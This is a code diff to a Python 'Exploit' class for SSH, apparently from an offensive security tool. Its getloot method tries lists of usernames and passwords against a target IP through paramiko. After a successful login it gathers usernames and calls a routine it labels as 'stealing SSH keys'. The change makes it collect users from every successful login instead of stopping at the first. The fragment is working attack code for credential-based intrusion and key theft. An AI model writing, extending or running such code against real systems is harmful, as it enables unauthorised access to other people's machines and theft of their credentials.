@@ -37,6 +37,7 @@ class SSH(Exploit):
 
     def getloot(self, ip_address, credentials):
         # try to log into ssh using credentials
+        users = []
         for c in credentials:
             print(f"{Color.BMAGEN}Trying to SSH into IP address {ip_address} with:{Color.END}\n Username: {c[0]} and Password: {c[1]}", file=self.output)
             ssh = paramiko.SSHClient()
@@ -48,8 +49,8 @@ class SSH(Exploit):
                 ssh.close()
             else:
                 print(f'{Color.BGRN}Success.{Color.END}{Color.BMAGEN}Now gathering all usernames.{Color.END}', file=self.output)
-                usernames = self.get_usernames(ssh)
+                users.append(self.get_usernames(ssh))
                 
                 print(f'{Color.BGRN}Success.{Color.END}{Color.BMAGEN}Now stealing SSH keys.{Color.END}', file=self.output)
                 self.get_sshkeys(ssh, ip_address, c[0])
-                return usernames
+        return users
